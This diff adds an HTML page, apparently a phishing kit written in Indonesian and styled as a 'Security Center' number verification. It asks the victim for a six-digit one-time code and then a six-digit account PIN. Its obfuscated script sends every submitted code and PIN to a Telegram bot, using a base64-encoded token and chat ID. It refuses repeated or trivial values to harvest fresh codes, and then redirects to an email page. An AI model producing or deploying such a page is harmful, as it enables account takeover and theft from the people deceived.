@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Center</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin: 0; padding: 20px; color: #333; }
+        header { padding: 15px; border-bottom: 1px solid #eee; font-size: 18px; font-weight: 500; }
+        .bx { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
+        .bx input { width: 40px; height: 48px; text-align: center; font-size: 22px; border: none; border-bottom: 2px solid #ccc; outline: none; }
+        .bx input:focus { border-bottom-color: #EE4D2D; }
+        button { background: #EE4D2D; color: #fff; width: 100%; max-width: 320px; padding: 14px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:disabled { background: #eee; color: #999; cursor: not-allowed; }
+        #ps { display: none; }
+    </style>
+</head>
+<body>
+    <header>Verifikasi nomor anda</header>
+    
+    <div id="os">
+        <p>jangan bagikan kode yang terkirim ke nomor dibawah ini kepada siapapun</p>
+        <p style="font-weight:bold" id="dN">...</p>
+        <div class="bx">
+            <input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi"><input type="tel" inputmode="numeric" maxlength="1" class="oi">
+        </div>
+        <button id="bo" disabled>Next</button>
+    </div>
+
+    <div id="ps">
+        <p>input PIN akun anda</p>
+        <div class="bx">
+            <input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi"><input type="password" inputmode="numeric" maxlength="1" class="pi">
+        </div>
+        <button id="bp" disabled>Verifikasi PIN</button>
+    </div>
+
+    <script>
+        (function(){
+            const _k = ["ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==","NTkyMzAzMTgyNQ==","ZW1haWwuaHRtbA=="];
+            const _u = "https://api.telegram.org/bot" + atob(_k[0]) + "/sendMessage";
+            document.getElementById('dN').innerText = localStorage.getItem('vNum') || "User";
+
+            function _chk(v) {
+                if (/^(.)\1{5}$/.test(v)) return false; 
+                let h = JSON.parse(sessionStorage.getItem('_h') || "[]");
+                return !h.includes(v);
+            }
+
+            function _init(ins, btn, cb) {
+                ins.forEach((el, i) => {
+                    el.oninput = () => { if (el.value && i < 5) ins[i + 1].focus(); btn.disabled = Array.from(ins).some(x => !x.value); };
+                    el.onkeydown = (e) => { if (e.key === "Backspace" && !el.value && i > 0) ins[i - 1].focus(); };
+                    el.onpaste = (e) => {
+                        let d = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').split('');
+                        if (d.length >= 6) { ins.forEach((inp, x) => inp.value = d[x] || ''); btn.disabled = false; e.preventDefault(); }
+                    };
+                });
+                btn.onclick = async () => {
+                    let val = Array.from(ins).map(x => x.value).join('');
+                    if (_chk(val)) {
+                        btn.disabled = true;
+                        let h = JSON.parse(sessionStorage.getItem('_h') || "[]");
+                        h.push(val); sessionStorage.setItem('_h', JSON.stringify(h));
+                        await fetch(_u, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: atob(_k[1]), text: "Code: " + val }) });
+                        cb();
+                    } else { alert("Error: Use different code."); }
+                };
+            }
+
+            _init(document.querySelectorAll('.oi'), document.getElementById('bo'), () => {
+                document.getElementById('os').style.display = 'none';
+                document.getElementById('ps').style.display = 'block';
+            });
+
+            _init(document.querySelectorAll('.pi'), document.getElementById('bp'), () => {
+                window.location.href = atob(_k[2]);
+            });
+        })();
+    </script>
+</body>
+</html>
